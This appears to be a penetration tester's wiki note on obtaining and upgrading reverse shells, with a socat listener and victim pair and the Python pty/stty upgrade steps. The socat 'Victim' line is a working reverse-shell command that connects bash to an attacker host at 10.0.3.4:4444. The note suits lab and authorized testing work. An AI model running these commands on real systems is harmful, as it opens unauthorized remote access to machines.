# Generating Initial Revshells
https://revshells.com is an excellent tool for generating a copy/paste shell command for your target machine and method.  See also [[Shellcode]], [[Sliver C2]], [[Meterpreter]] for generating high-quality implants for [[Persistence]] after stabilizing your shell. 

# Shell Upgrades
Reverse shells are great, but they often lack many of the useful features that we typically expect from our shells and TTYs. Upgrading your reverse shell can make it more user-friendly, which makes your post-exploitation quicker and easier. Additionally, upgrading your reverse shell makes it less likely that you'll accidentally kill the reverse shell by hitting "Ctrl-C."

This post is a comprehensive list of the easiest and best ways to upgrade your reverse shell:
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
## SOCAT Full TTY
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## Standard NC shell upgrade
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
I highly recommend trying out the easier ones, as they'll make post-exploitation easier.

# Payloads
Additional high-quality payloads.
[[Nishang]]
[[Python PTY Shells]]
